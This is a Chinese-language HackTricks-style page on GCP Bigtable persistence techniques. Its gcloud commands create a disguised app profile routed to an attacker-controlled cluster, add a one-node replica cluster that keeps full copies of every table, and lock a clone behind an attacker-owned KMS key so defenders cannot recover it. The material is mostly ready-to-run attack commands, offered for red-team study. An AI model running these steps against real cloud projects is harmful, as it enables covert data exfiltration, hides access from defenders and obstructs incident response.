# GCP - Bigtable 持久化

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

有关 Bigtable 的更多信息，请参阅：

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

### 专用的攻击者 App Profile

**权限：** `bigtable.appProfiles.create`, `bigtable.appProfiles.update`.

创建一个将流量路由到你的副本集群的 app profile，并启用 Data Boost，这样你就不必依赖防御者可能注意到的预配置节点。

<details>

<summary>Create stealth app profile</summary>
```bash
gcloud bigtable app-profiles create stealth-profile \
--instance=<instance-id> --route-any --restrict-to=<attacker-cluster> \
--row-affinity --description="internal batch"

gcloud bigtable app-profiles update stealth-profile \
--instance=<instance-id> --data-boost \
--data-boost-compute-billing-owner=HOST_PAYS
```
</details>

只要该配置文件存在，你就可以使用引用它的新凭证重新连接。

### 维护你自己的副本集群

**权限：** `bigtable.clusters.create`, `bigtable.instances.update`, `bigtable.clusters.list`.

在一个低活动区域配置一个节点数最少的集群。即使你的客户端身份消失，**该集群会保留每个表的完整副本**，直到防御者明确删除它为止。

<details>

<summary>创建副本集群</summary>
```bash
gcloud bigtable clusters create dark-clone \
--instance=<instance-id> --zone=us-west4-b --num-nodes=1
```
</details>

通过 `gcloud bigtable clusters describe dark-clone --instance=<instance-id>` 监控它，以便在需要拉取数据时可以立即扩展。

### 将复制置于您自己的 CMEK 之后

**权限：** `bigtable.clusters.create`, `cloudkms.cryptoKeyVersions.useToEncrypt`（在攻击者拥有的密钥上）。

在启动克隆时使用您自己的 KMS 密钥。没有该密钥，Google 无法重新创建或对集群进行故障转移，因此 blue teams 在处理之前必须与您协调。

<details>

<summary>创建受 CMEK 保护的集群</summary>
```bash
gcloud bigtable clusters create cmek-clone \
--instance=<instance-id> --zone=us-east4-b --num-nodes=1 \
--kms-key=projects/<attacker-proj>/locations/<kms-location>/keyRings/<ring>/cryptoKeys/<key>
```
</details>

在你的项目中轮换或禁用该密钥即可立即让副本失效（同时仍允许你稍后重新启用它）。

{{#include ../../../banners/hacktricks-training.md}}
